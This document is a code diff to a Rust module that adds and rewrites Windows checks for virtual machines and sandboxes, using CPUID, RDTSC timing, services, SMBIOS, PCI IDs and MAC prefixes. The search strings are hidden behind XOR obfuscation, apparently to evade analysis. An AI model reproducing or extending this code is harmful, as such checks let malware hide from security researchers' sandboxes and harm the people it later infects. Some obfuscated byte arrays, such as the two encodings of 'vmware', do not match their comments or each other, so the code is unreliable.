@@ -1,21 +1,33 @@
 use crate::recovery::helpers::obfuscation::deobf;
 use std::collections::HashSet;
-use windows::Win32::NetworkManagement::IpHelper::{
+use std::ptr::{null, null_mut};
+use windows_sys::Win32::NetworkManagement::IpHelper::{
     GAA_FLAG_INCLUDE_PREFIX, GetAdaptersAddresses, IP_ADAPTER_ADDRESSES_LH,
 };
-use windows::Win32::System::Diagnostics::ToolHelp::{
+use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS,
 };
-use windows::Win32::System::SystemInformation::GetSystemInfo;
-use windows::Win32::System::SystemInformation::SYSTEM_INFO;
-use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
+use windows_sys::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO, GetSystemFirmwareTable};
+use windows_sys::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
+use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+
+fn pwstr_to_string(ptr: *const u16) -> String {
+    if ptr.is_null() {
+        return String::new();
+    }
+    let mut len = 0;
+    while unsafe { *ptr.add(len) } != 0 {
+        len += 1;
+    }
+    let slice = unsafe { std::slice::from_raw_parts(ptr, len) };
+    String::from_utf16_lossy(slice)
+}
 
 pub fn check_cpuid_hypervisor() -> bool {
     #[cfg(target_arch = "x86_64")]
     unsafe {
         use std::arch::x86_64::__cpuid;
         let res = __cpuid(1);
-        // ECX bit 31 indicates hypervisor
         if (res.ecx & (1 << 31)) == 0 {
             return false;
         }
@@ -72,7 +84,7 @@ pub fn check_screen_resolution() -> bool {
 
 pub fn check_cpu_cores() -> bool {
     unsafe {
-        let mut info = SYSTEM_INFO::default();
+        let mut info = std::mem::zeroed::<SYSTEM_INFO>();
         GetSystemInfo(&mut info);
         info.dwNumberOfProcessors < 2
     }
@@ -81,23 +93,25 @@ pub fn check_cpu_cores() -> bool {
 pub fn check_processes() -> bool {
     let mut processes = HashSet::new();
     unsafe {
-        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if let Ok(handle) = snapshot {
-            let mut entry = PROCESSENTRY32W::default();
-            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+        let handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if handle as isize != INVALID_HANDLE_VALUE as isize {
+            let mut entry = PROCESSENTRY32W {
+                dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
+                ..std::mem::zeroed()
+            };
 
-            if Process32FirstW(handle, &mut entry).is_ok() {
+            if Process32FirstW(handle, &mut entry) != 0 {
                 loop {
-                    if let Ok(name) = String::from_utf16(&entry.szExeFile) {
-                        let name = name.trim_matches('\0').to_lowercase();
-                        processes.insert(name);
-                    }
-                    if Process32NextW(handle, &mut entry).is_err() {
+                    let name = String::from_utf16_lossy(&entry.szExeFile);
+                    let name = name.trim_matches('\0').to_lowercase();
+                    processes.insert(name);
+                    
+                    if Process32NextW(handle, &mut entry) == 0 {
                         break;
                     }
                 }
             }
-            let _ = windows::Win32::Foundation::CloseHandle(handle);
+            CloseHandle(handle);
         }
     }
 
@@ -233,8 +247,7 @@ pub fn check_usernames() -> bool {
 }
 
 pub fn check_disk_size() -> bool {
-    use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
-    use windows::core::PCWSTR;
+    use windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
 
     unsafe {
         let mut total_bytes = 0u64;
@@ -242,15 +255,15 @@ pub fn check_disk_size() -> bool {
         let mut total_free = 0u64;
         let path = deobf(&[0x9E, 0x85, 0xEC, 0xBD])
             .encode_utf16()
+            .chain(std::iter::once(0))
             .collect::<Vec<u16>>();
 
         if GetDiskFreeSpaceExW(
-            PCWSTR(path.as_ptr()),
-            Some(&mut free_bytes),
-            Some(&mut total_bytes),
-            Some(&mut total_free),
-        )
-        .is_ok()
+            path.as_ptr(),
+            &mut free_bytes,
+            &mut total_bytes,
+            &mut total_free,
+        ) != 0
         {
             if total_bytes < 60 * 1024 * 1024 * 1024 {
                 return true;
@@ -260,16 +273,224 @@ pub fn check_disk_size() -> bool {
     false
 }
 
+pub fn check_hypervisor_brand() -> bool {
+    #[cfg(target_arch = "x86_64")]
+    unsafe {
+        use std::arch::x86_64::__cpuid;
+        let res = __cpuid(0x40000000);
+        let mut brand = [0u8; 12];
+        brand[0..4].copy_from_slice(&res.ebx.to_le_bytes());
+        brand[4..8].copy_from_slice(&res.ecx.to_le_bytes());
+        brand[8..12].copy_from_slice(&res.edx.to_le_bytes());
+        
+        let brand_str = String::from_utf8_lossy(&brand).to_lowercase();
+        let vm_brands = [
+            deobf(&[0xEB, 0xF0, 0xCA, 0xDC, 0xCF, 0xD8]), // vmware
+            deobf(&[0xEB, 0xFF, 0xD2, 0xC5]),             // vbox
+            deobf(&[0xCD, 0xD4, 0xCF, 0xDC, 0xD1, 0xD1, 0xD8, 0xD1]), // parallels
+            deobf(&[0xCD, 0xD2, 0xCD, 0xD4]), // qemu
+            deobf(&[0xCD, 0xD2, 0xCD, 0xD4, 0x8F, 0x8F]), // qemu..
+            deobf(&[0xCD, 0xD2, 0xCD, 0xD4, 0xCD, 0xD2, 0xCD, 0xD4]), // qemuqemu
+            "microsoft hv".to_string(),
+            "kvmkvmkvm".to_string(),
+            "xenvmmxenvmm".to_string(),
+        ];
+
+        for b in vm_brands {
+            if brand_str.contains(&b) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+pub fn check_timing_drift() -> bool {
+    #[cfg(target_arch = "x86_64")]
+    unsafe {
+        use core::arch::x86_64::{_mm_lfence, _rdtsc};
+        
+        _mm_lfence();
+        let tsc1 = _rdtsc();
+        _mm_lfence();
+        
+        // Sleep for a short duration
+        std::thread::sleep(std::time::Duration::from_millis(50));
+        
+        _mm_lfence();
+        let tsc2 = _rdtsc();
+        _mm_lfence();
+        
+        let diff = tsc2.wrapping_sub(tsc1);
+        
+        if diff < 1_000_000 {
+            return true;
+        }
+    }
+    false
+}
+
+pub fn check_services() -> bool {
+    use windows_sys::Win32::System::Services::{
+        EnumServicesStatusExW, OpenSCManagerW, SC_ENUM_PROCESS_INFO, SC_MANAGER_CONNECT,
+        SC_MANAGER_ENUMERATE_SERVICE, SERVICE_STATE_ALL, ENUM_SERVICE_STATUS_PROCESSW,
+        SERVICE_WIN32, CloseServiceHandle,
+    };
+
+    unsafe {
+        let scm = OpenSCManagerW(null(), null(), SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
+        if scm.is_null() {
+            return false;
+        }
+
+        let mut bytes_needed = 0u32;
+        let mut services_returned = 0u32;
+        let mut resume_handle = 0u32;
+
+        let _ = EnumServicesStatusExW(
+            scm,
+            SC_ENUM_PROCESS_INFO,
+            SERVICE_WIN32,
+            SERVICE_STATE_ALL,
+            null_mut(),
+            0,
+            &mut bytes_needed,
+            &mut services_returned,
+            &mut resume_handle,
+            null(),
+        );
+
+        if bytes_needed == 0 {
+            CloseServiceHandle(scm);
+            return false;
+        }
+
+        let mut buffer = vec![0u8; bytes_needed as usize];
+        if EnumServicesStatusExW(
+            scm,
+            SC_ENUM_PROCESS_INFO,
+            SERVICE_WIN32,
+            SERVICE_STATE_ALL,
+            buffer.as_mut_ptr(),
+            bytes_needed,
+            &mut bytes_needed,
+            &mut services_returned,
+            &mut resume_handle,
+            null(),
+        ) != 0
+        {
+            let services = std::slice::from_raw_parts(
+                buffer.as_ptr() as *const ENUM_SERVICE_STATUS_PROCESSW,
+                services_returned as usize,
+            );
+
+            let vm_services = [
+                deobf(&[0xCB, 0xD0, 0xCA, 0xDC, 0xCF, 0xD8]), // vmware
+                deobf(&[0xCB, 0xDF, 0xD2, 0xC5]),             // vbox
+                deobf(&[0xDF, 0xD2, 0xC5, 0xDE, 0xD8, 0xCF]), // boxser
+                deobf(&[0xCB, 0xD0, 0xC8, 0xCE, 0xCF, 0xCB, 0xDE]), // vmusrvc
+                deobf(&[0xCB, 0xD0, 0xCE, 0xCF, 0xCB, 0xDE]),       // vmsrvc
+                deobf(&[0xE2, 0xDE, 0xDE, 0xD2, 0xCF, 0xCB]),       // hyper-v
+            ];
+
+            for service in services {
+                let name = pwstr_to_string(service.lpServiceName).to_lowercase();
+                let display = pwstr_to_string(service.lpDisplayName).to_lowercase();
+                
+                for s in &vm_services {
+                    if name.contains(s) || display.contains(s) {
+                        CloseServiceHandle(scm);
+                        return true;
+                    }
+                }
+            }
+        }
+
+        CloseServiceHandle(scm);
+    }
+    false
+}
+
+pub fn check_firmware() -> bool {
+    unsafe {
+        // 'RSMB' - Raw SMBIOS table
+        let signature = u32::from_be_bytes(*b"RSMB");
+        let size = GetSystemFirmwareTable(signature, 0, null_mut(), 0);
+        if size == 0 {
+            return false;
+        }
+
+        let mut buffer = vec![0u8; size as usize];
+        if GetSystemFirmwareTable(signature, 0, buffer.as_mut_ptr(), size) == 0 {
+            return false;
+        }
+
+        let content = String::from_utf8_lossy(&buffer).to_lowercase();
+        let vm_strings = [
+            deobf(&[0xEB, 0xF0, 0xCA, 0xDC, 0xCF, 0xD8]), // vmware
+            deobf(&[0xEB, 0xFF, 0xD2, 0xC5, 0xEB, 0xFF, 0xD2, 0xC5]), // vbox
+            deobf(&[0xCD, 0xD4, 0xCF, 0xDC, 0xD1, 0xD1, 0xD8, 0xD1]), // parallels
+            deobf(&[0xEB, 0xF0, 0xF6]), // kvm
+            deobf(&[0xD0, 0xD2, 0xCD, 0xD4]), // qemu
+            deobf(&[0xDF, 0xD2, 0xC5]), // box
+        ];
+
+        for s in vm_strings {
+            if content.contains(&s) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+pub fn check_pci_devices() -> bool {
+    use windows_sys::Win32::Devices::DeviceAndDriverInstallation::{
+        SetupDiDestroyDeviceInfoList, SetupDiEnumDeviceInfo, SetupDiGetClassDevsW,
+        SetupDiGetDeviceInstanceIdW, DIGCF_ALLCLASSES, DIGCF_PRESENT, SP_DEVINFO_DATA,
+    };
+
+    unsafe {
+        let h_dev_info = SetupDiGetClassDevsW(null(), null(), null_mut(), DIGCF_ALLCLASSES | DIGCF_PRESENT);
+        if h_dev_info as isize == INVALID_HANDLE_VALUE as isize {
+            return false;
+        }
+
+        let mut dev_info_data = SP_DEVINFO_DATA {
+            cbSize: std::mem::size_of::<SP_DEVINFO_DATA>() as u32,
+            ..std::mem::zeroed()
+        };
+
+        let mut i = 0;
+        while SetupDiEnumDeviceInfo(h_dev_info, i, &mut dev_info_data) != 0 {
+            let mut buffer = [0u16; 256];
+            let mut required_size = 0u32;
+            if SetupDiGetDeviceInstanceIdW(
+                h_dev_info,
+                &dev_info_data,
+                buffer.as_mut_ptr(),
+                buffer.len() as u32,
+                &mut required_size,
+            ) != 0
+            {
+                let id = String::from_utf16_lossy(&buffer[..required_size as usize])
+                    .to_lowercase();
+                
+                if id.contains("ven_80ee") || id.contains("dev_cafe") || 
+                   id.contains("ven_15ad") || id.contains("ven_1af4") {
+                    SetupDiDestroyDeviceInfoList(h_dev_info);
+                    return true;
+                }
+            }
+            i += 1;
+        }
+
+        SetupDiDestroyDeviceInfoList(h_dev_info);
+    }
+    false
+}
+
 pub fn check_mac_address() -> bool {
-    // 00:05:69 - VMWare
-    // 00:0C:29 - VMWare
-    // 00:1C:14 - VMWare
-    // 00:50:56 - VMWare
-    // 08:00:27 - VirtualBox
-    // 0A:00:27 - VirtualBox
-    // 00:03:FF - Microsoft Hyper-V (Legacy)
-    // 00:15:5D - Microsoft Hyper-V
-    // 00:16:3E - Xen
     let suspicious_ouis = [
         [0x00, 0x05, 0x69],
         [0x00, 0x0C, 0x29],
@@ -286,10 +507,10 @@ pub fn check_mac_address() -> bool {
         let mut buffer_len = 15000;
         let mut buffer = vec![0u8; buffer_len as usize];
         let ret = GetAdaptersAddresses(
-            windows::Win32::Networking::WinSock::AF_UNSPEC.0 as u32,
+            windows_sys::Win32::Networking::WinSock::AF_UNSPEC as u32,
             GAA_FLAG_INCLUDE_PREFIX,
-            None,
-            Some(buffer.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH),
+            null_mut(),
+            buffer.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH,
             &mut buffer_len,
         );
 
